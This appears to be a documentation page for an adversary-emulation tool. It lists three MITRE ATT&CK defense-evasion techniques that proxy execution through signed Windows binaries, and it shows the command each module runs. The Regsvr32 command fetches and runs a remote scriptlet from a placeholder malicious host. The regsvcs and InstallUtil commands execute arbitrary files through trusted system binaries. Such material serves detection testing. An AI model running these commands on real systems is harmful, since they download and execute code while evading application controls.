Defense Evasion
^^^^^^^^^^^^^^^

=======================================
Signed Binary Proxy Execution: Regsvr32
=======================================
T1218.010_

.. _T1218.010: https://attack.mitre.org/techniques/T1218/010/


| This module uses the CreateProcess Win32 API to execute
| **regsvr32.exe /u /n /s /i:http://malicious.domain:8080/payload.sct scrobj.dll**


=============================================
Signed Binary Proxy Execution: Regsvcs/Regasm
=============================================
T1218.009_

.. _T1218.009: https://attack.mitre.org/techniques/T1218/009/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U winword.dll**

==========================================
Signed Binary Proxy Execution: InstallUtil
==========================================
T1218.004_

.. _T1218.004: https://attack.mitre.org/techniques/T1218/004/


| This module uses the CreateProcess Win32 API to execute
| **C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U C:\Windows\Temp\XKNqbpzl.exe**